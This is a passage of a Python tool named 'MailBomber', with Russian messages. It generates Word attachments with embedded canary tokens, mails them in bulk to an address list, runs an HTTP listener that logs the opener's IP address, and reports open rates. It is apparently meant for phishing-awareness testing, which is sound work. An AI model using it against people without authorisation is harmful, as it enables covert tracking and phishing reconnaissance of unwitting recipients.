        # an iterator value in a list pointing to the directory following the slash
        position_after_slash = 1
        return position_after_slash

    @staticmethod
    def get_number_of_parts_in_http_request():
        # method, target, ver
        number_of_parts_in_request = 3
        return number_of_parts_in_request

    @staticmethod
    def _parse_request(conn):
        rfile = conn.makefile('rb')
        raw = rfile.readline(Listener.get_max_line_length() + 1)

        if len(raw) > Listener.get_max_line_length():
            error_msg = 'Размер ответа превышает допустимое значение.'
            raise Exception(Helper.print_error(error_msg))

        req_line = str(raw, 'iso-8859-1')
        req_line = req_line.rstrip('\r\n')
        words = req_line.split()
        if len(words) != Listener.get_number_of_parts_in_http_request(): # method, target, ver
            error_msg = 'Неверный формат строки запроса.'
            raise Exception(Helper.print_error(error_msg))

        method, target, ver = words

        url_parsed = urlparse(target)
        data_with_workspace = url_parsed.path
        data_with_token = parse_qs(url_parsed.query)

        return data_with_workspace, data_with_token

    @staticmethod
    def _check_workspace(data):
        parts = str(data).split('/')
        if len(parts) > Listener.get_number_of_parts_in_target_request():
            return False

        workspace = parts[Listener.get_position_after_slash()].replace(' ', '')
        if not workspace:
            return False

        return workspace

    @staticmethod
    def _check_token(data):
        if len(data) != Listener.get_number_of_parameters_in_request():
            return False

        token = data.get('token')
        if token is None:
            return False

        if len(token) != Listener.get_number_of_values_in_parameter():
            return False

        if len(token[0]) != Canary.get_canary_token_length():
            return False

        return token[0]

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server_socket.bind((self._host, self._port))
        self.server_socket.listen()

        while True:
            conn, addr = self.server_socket.accept()
            source_ip = addr[0]

            thread = threading.Thread(target=Listener._post_processing, args=(self,conn,source_ip))
            thread.start()

    def _post_processing(self, conn, addr):

        data_with_workspace, data_with_token = Listener._parse_request(conn)

        workspace = Listener._check_workspace(data_with_workspace)
        if not workspace:
            return False

        token = Listener._check_token(data_with_token)
        if not token:
            return False

        result = self._write_result(workspace, token, addr)
        if not result:
            return False

        return True

    def _write_result(self, workspace, token, source_ip):

        datetime_now = datetime.now()
        datetime_opening = datetime_now.strftime("%d/%m/%Y, %H:%M:%S")

        triggered = (workspace, token, source_ip, datetime_opening)

        while not self._database.db_free:
            sleep(uniform(0.2, 0.5))
            continue

        self._database.db_free = False
        self._database.open_connection()

        info_msg = f'{datetime_opening} / {source_ip} / {workspace} / {token}'
        print(Helper.print_info(info_msg))

        self._database.execute_query(DBResults.get_sql_query_ii_triggered(), data=triggered)

        self._database.close_connection()
        self._database.db_free = True

        return True


class MailBomber:
    """
        MailBomber.
        _______________________________________________________________________________________________
        Класс, включающий основную связующую логику работы программы.

    """

    def __init__(self):

        try:
            self.print_banner()

            self.parser_arguments = ParserArguments()
            self.parser_config = ParserConfig(self.parser_arguments.arguments.config_file)
            self.db_results = DBResults(self.parser_arguments.arguments.db_file)

            self.attack_mode = self.parser_arguments.arguments.attack_mode

            self._listener_proc = None
            self._threads = []
            self._number_of_emails_sent = 0
            self.temp_dir = None
            self.thread_lock = threading.Lock()

            self.listener = None
            self.canary = None
            self.mailer = None

        except Exception as e:
            exception_msg = f'{e}.'
            raise Exception(Helper.print_exception(exception_msg))

    @staticmethod
    def get_banner():
        banner = """
##   ##    ##      ####    ##                #####     ####    ##   ##  #####    ######   #####
### ###   ####      ##     ##                ##  ##   ##  ##   ### ###  ##  ##   ##       ##  ##
#######  ##  ##     ##     ##                ##  ##   ##  ##   #######  ##  ##   ##       ##  ##
## # ##  ######     ##     ##                #####    ##  ##   ## # ##  #####    ####     #####
##   ##  ##  ##     ##     ##                ##  ##   ##  ##   ##   ##  ##  ##   ##       ####
##   ##  ##  ##     ##     ##                ##  ##   ##  ##   ##   ##  ##  ##   ##       ## ##
##   ##  ##  ##    ####    ######            #####     ####    ##   ##  #####    ######   ##  ##
    """
        return banner

    @staticmethod
    def print_banner():
        print(MailBomber.get_banner())
        time.sleep(1)

    def run_listener(self):
        try:
            self._listener_proc = multiprocessing.Process(target=self.listener.run)
            self._listener_proc.start()

            multiprocessing.log_to_stderr(logging.INFO)

            address = self.parser_config.config['HTTP_LISTENER']['HTTP_LISTENER_IP']
            tcp_port = self.parser_config.config['HTTP_LISTENER']['HTTP_LISTENER_PORT']
            info_msg = ('Запуск процесса приема входящих HTTP запросов:'
                        f'\n\t|-- IP-адрес: {address},'
                        f'\n\t|-- TCP-порт: {tcp_port} ...')

            print(f'\n{Helper.print_info(info_msg)}')

            while True:
                info_msg = 'Для завершения работы введите: exit (CTRL+C).\n\n'
                command = input(f'\n{Helper.print_info(info_msg)}')

                if command == 'exit':
                    raise KeyboardInterrupt

        except KeyboardInterrupt:
            multiprocessing.log_to_stderr(logging.FATAL)

            self._listener_proc.terminate()

            info_msg = 'Ожидание завершения всех процессов ...'
            print(f'\n{Helper.print_info(info_msg)}')

            while self._listener_proc.is_alive():
                sleep(1)

            self._listener_proc.close()

            info_msg = 'Прием входящих HTTP запросов остановлен ...'
            print(f'\n{Helper.print_info(info_msg)}\n')

        except Exception as e:
            exception_msg = f'{e}.'
            raise Exception(Helper.print_exception(exception_msg))

    def print_info_attack_mode_one(self):
        info_msg = ('Запуск в режиме генерации вложений и отправки почтовых сообщений:'
                    f'\n\t|-- Emails list: {self.parser_arguments.arguments.emails_list},'
                    f'\n\t|-- Config file: {self.parser_arguments.arguments.config_file},'
                    f'\n\t|-- Result database file: {self.parser_arguments.arguments.db_file}.\n')

        print(f'\n{Helper.print_info(info_msg)}')

        info_msg = 'Запуск процесса генерации вложений по заданному списку почтовых адресов ...\n'
        print(Helper.print_info(info_msg))
        sleep(1)

    def save_payload_in_dir(self, payload, current_iteration):
        output_dir = self.parser_arguments.arguments.output_dir
        Helper.create_dir_if_not_exist(output_dir)

        filename = self.parser_config.config['WORKSPACE']['WORKSPACE_PAYLOAD_FILENAME'] + '_' + str(current_iteration) + '.docx'
        filepath_to_payload = PurePath(output_dir, filename)

        with open(filepath_to_payload, "wb") as f:
            f.write(payload)

        return filepath_to_payload

    def save_payload_in_temp(self, payload, temp_dir):
        filename = self.parser_config.config['WORKSPACE']['WORKSPACE_PAYLOAD_FILENAME'] + '.docx'
        filepath_to_payload = PurePath(temp_dir, filename)

        with open(filepath_to_payload, "wb") as f:
            f.write(payload)

        return filepath_to_payload

    def create_threads(self):
        number_threads = self.parser_config.config['WORKSPACE']['WORKSPACE_THREADS']

        if len(self.mailer.emails_to_send) < int(number_threads):
            self._threads.append(threading.Thread(target=MailBomber.run_attack_mode_one, args=(self, self.mailer.emails_to_send)))
        else:
            chunks = numpy.array_split(self.mailer.emails_to_send, int(number_threads))
            for chunk in chunks:
                emails = chunk.tolist()
                self._threads.append(threading.Thread(target=MailBomber.run_attack_mode_one, args=(self, emails)))

    def run_attack_mode_one(self, emails):

        length_emails = len(self.mailer.emails_to_send)

        # по всем почтовым адресам для отправки
        for current_email in emails:

            canary = Canary(self.parser_config)
            payload = canary.make_canary_msword()

            # сохраняем вложение в казанный каталог (в противном случае во временный каталог для последующей отправки)
            if self.parser_arguments.arguments.dont_save.lower() == 'false' or self.parser_arguments.arguments.dont_sent.lower() == 'true':
                filepath_to_payload = self.save_payload_in_dir(payload, current_email)
            else:
                filepath_to_payload = self.save_payload_in_temp(payload, self.temp_dir)

            # отправка почтового сообщения
            if self.parser_arguments.arguments.dont_sent.lower() == 'false':
                self.mailer.send_mail(canary.token, current_email, filepath_to_payload)

            with self.thread_lock:
                self._number_of_emails_sent += 1
                progress = f'{self._number_of_emails_sent} из {length_emails} ({current_email}) ...\n'
                print(Helper.print_info(progress))

    def generate_report(self):

        html_report = HtmlBuilder()

        workspaces = self.db_results.get_all_workspaces_in_db()

        datetime_report = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        headline = f"<div class='one'>\n<h1>Отчет по результатам работы на {datetime_report}</h1>\n</div>\n</br>\n"
        html_report.build_html_body_string(headline)

        block_statistics = "<div class='two'>\n<h1><span>Общая статистическая информация</span></h1>\n</div>\n"
        html_report.build_html_body_string(block_statistics)
        statistics = self.db_results.get_statistics_in_db(workspaces)

        table_headers = ['Рабочая область', 'Отправлено писем', 'Открыто вложений', 'Ошибок отправки']
        table_data = []

        for workspace in statistics.keys():
            count_sent_emails = int(statistics[workspace]['sent_emails'])
            count_triggered = int(statistics[workspace]['triggered'])
            count_dont_send_emails = int(statistics[workspace]['dont_send_emails'])

            try:
                if count_sent_emails > 0 and count_triggered > 0:
                    percent_triggered = (count_triggered/count_sent_emails) * 100

                elif count_sent_emails == 0 and count_triggered > 0:
                    percent_triggered = count_triggered*100

                else:
                    percent_triggered = 0

            finally:
                triggered_string = f'{count_triggered} ({percent_triggered:.2f}%)'

            table_data.append([workspace, count_sent_emails, triggered_string, count_dont_send_emails])

        html_report.add_table_to_html(table_data, table_headers)

        identified_triggers, dont_identified_triggers = self.db_results.get_strings_in_triggered(workspaces)

        if len(identified_triggers) == 0:
            block_identified_triggers = '</br></br><div class="two">\n<h1><span>Идентифицированные сработки в базе данных отсутствуют</span>\n</div></h1>\n'
            html_report.build_html_body_string(block_identified_triggers)
        else:
            block_identified_triggers = '</br></br><div class="two">\n<h1><span>Идентифицированные сработки</span>\n</div></h1>\n'
            html_report.build_html_body_string(block_identified_triggers)

            table_headers = ['Рабочая область', 'email', 'IP-адрес', 'Отправлено', 'Открыто', 'Canary token']
            html_report.add_table_to_html(identified_triggers, table_headers)

        if len(dont_identified_triggers) == 0:
            block_dont_identified_triggers = '</br></br><div class="two">\n<h1><span>Не идентифицированные сработки в базе данных отсутствуют</span>\n</div></h1>\n'
            html_report.build_html_body_string(block_dont_identified_triggers)
        else:
            block_dont_identified_triggers = '</br></br><div class="two">\n<h1><span>Не идентифицированные сработки</span>\n</div></h1>\n'
            html_report.build_html_body_string(block_dont_identified_triggers)

            table_headers = ['Рабочая область', 'IP-адрес', 'Открыто', 'Canary token']
            html_report.add_table_to_html(dont_identified_triggers, table_headers)

        report_filename = self.parser_config.config['WORKSPACE']['WORKSPACE_REPORT_FILENAME'] + '.html'
        report_filepath = os.path.join(CURRENT_DIR, report_filename)
        html_report.write_html_report(report_filename)

        info_msg = f'Отчет успешно сохранен: {report_filepath}.'
        print(Helper.print_info(info_msg))

    def main_cycle(self):
        try:
            if self.attack_mode == 1:

                self.print_info_attack_mode_one()

                self.mailer = Mailer(self.parser_arguments, self.parser_config, self.db_results)
                time.sleep(1)

                self.temp_dir = tempfile.mkdtemp()

                self.create_threads()

                for thread in self._threads:
                    thread.start()

                for thread in self._threads:
                    thread.join()

                # очистка временного каталога после отправки всех писем
                shutil.rmtree(self.temp_dir)

                if self.parser_arguments.arguments.dont_listener.lower() == 'false':
                    self.attack_mode = 2

            if self.attack_mode == 2:
                self.listener = Listener(self.parser_config, self.db_results)
                self.run_listener()

            if self.attack_mode == 3:
                self.generate_report()

        except Exception as e:
            exception_msg = f'{e}.'
            raise Exception(Helper.print_exception(exception_msg))


if __name__ == '__main__':
    try:
        mail_bomber = MailBomber()
        mail_bomber.main_cycle()

    except Exception as e:
        exception_msg = f'{e}.'
        print(Helper.print_exception(exception_msg))
